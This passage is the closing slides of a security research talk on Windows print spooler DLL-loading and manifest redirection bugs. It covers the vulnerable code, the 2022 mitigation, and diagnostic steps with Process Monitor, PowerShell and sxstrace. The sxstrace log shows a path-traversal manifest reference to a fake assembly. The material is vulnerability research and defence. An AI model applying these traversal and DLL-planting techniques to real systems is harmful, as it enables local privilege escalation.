void PrintConfigDataHelper::CreateConfigProviderHandle() { LPCWSTR lpConfigPath = GetConfigFilePath(); if (lpConfigPath && RevertToPrinterSelf()) { hModule = LoadLibrary(lpConfigPath); ImpersonatePrinterClient(); } // ... }

## Slide 72

May 2022 – spoolsv!EnableMitigations

DWORD Policy = GetSpoolerRedirectionPolicy(); SetProcessMitigationPolicy(ProcessRedirectionTrustPolicy, &Policy, sizeof(Policy)); // ...

if (MSRC70412_PrintManifestRedirectOptIn::IsEnabled()) { Policy = TRUE;

SetProcessMitigationPolicy(ProcessUserPointerAuthPolicy, &Policy, sizeof(Policy)); } // ...

## Slide 73

# Find DLL Loads using Process Monitor

|**_Filter Option_**|**_Match_**|**_Value_**|**_Result_**|
|---|---|---|---|
|User|begins with|NT AUTHORITY\|Include|
|Path|ends with|.dll|Include|
|Operation|is|CreateFile|Include|
|Detail|contains|Impersonating:_<USER>_|Include|
|Detail|excludes|Execute/Traverse|Exclude|

## Slide 74

# Check for the Process Mitigation

Value of 1 indicates mitigation is set.

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Check for the Process Mitigation
5) Administrator: Windows Powe X + -v
Enable-NtTokenPrivilege SeDebugPrivilege
$proc Get-NtProcess 6688
same 'kerneLbase! KernelBaseAssembLyManifestIgnorel
dDevicel ap’
“$addr $sym.GetAddressOfSymbol ($name)
Read-NtVirtualMemory $proc $addr 1
Value of 1 indicates mitigation is set.
```

## Slide 75

# Check for Isolation Aware Manifest

Needs to be "IsolationAware" Has at least one dependency.

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Check for Isolation Aware Manifest
BY Windows PowerShell
PS C:\> $m Get-—Win32ModuleManifest windows.storage.dll
PS C:\> $m.ResourceType
Unknown
PS C:\> $m.Dependencies
Microsoft.Windows.Common-Controls, type=win32, version=6.0.0.0, proc
essorArchitecture=*, pubLicKeyToken=6595b64144ccflidf, Language=*
Has at least one dependency.
```

## Slide 76

# Debugging SXS Loading

Start SXS trace

C:\> sxstrace Trace -logfile:my_trace.log

Parse SXS trace to a text file

C:\> sxstrace Parse -logfile:my_trace.log -outfile:my_trace.txt

INFO: Resolving reference

..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;..&#x5c;MyFakeRoot&#x5c;MyFakeRoot,language="&#x2a;",pr ocessorArchitecture="amd64",publicKeyToken="6595b64144ccf1df",type="win32",version="1.0.0.0". INFO: Begin assembly probing.

INFO: Did not find the assembly in WinSxS.

INFO: Attempt to probe manifest at

C:\WINDOWS\assembly\GAC_64\..\..\..\..\..\..\MyFakeRoot\MyFakeRoot\1.0.0.0_en-US_6595b64144ccf 1df\..\..\..\..\..\..\MyFakeRoot\MyFakeRoot.DLL.

## Slide 77

DEMO

## Slide 78

Final Thoughts

## Slide 79

Thank   you! Maddie Stone James Forshaw
